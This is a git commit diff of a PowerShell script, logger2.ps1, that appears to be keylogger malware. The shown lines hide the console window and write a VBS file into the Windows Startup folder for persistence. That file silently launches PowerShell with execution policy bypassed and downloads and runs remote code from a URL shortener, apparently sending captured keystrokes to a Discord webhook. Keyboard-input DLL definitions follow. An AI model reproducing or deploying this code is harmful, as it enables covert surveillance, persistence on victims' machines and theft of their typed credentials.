79fb4b0cfc4c93778216082faddc4dd2ac5871e7
ElPichiii <90940144+ElPichiii@users.noreply.github.com>
2024-01-03 00:45:39 +0100

    Add files via upload

--- logger2.ps1
+++ logger2.ps1
@@ -15,13 +15,13 @@ else{
     $Type::ShowWindowAsync($hwnd, 0)
 }
 
-$vbs = @'
+$mkFile = @'
 Set WshShell = WScript.CreateObject("WScript.Shell")
 WScript.Sleep 200
 WshShell.Run "powershell.exe -NoP -Ep Bypass -W H -C $dc='https://t.ly/exQMG'; irm https://is.gd/bw_kl_to_dc | iex", 0, True
 '@
 $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
-$vbs | Out-File -FilePath $pth -Force
+$mkFile | Out-File -FilePath $pth -Force
 
 # Import DLL Definitions for keyboard inputs
 $API = @'
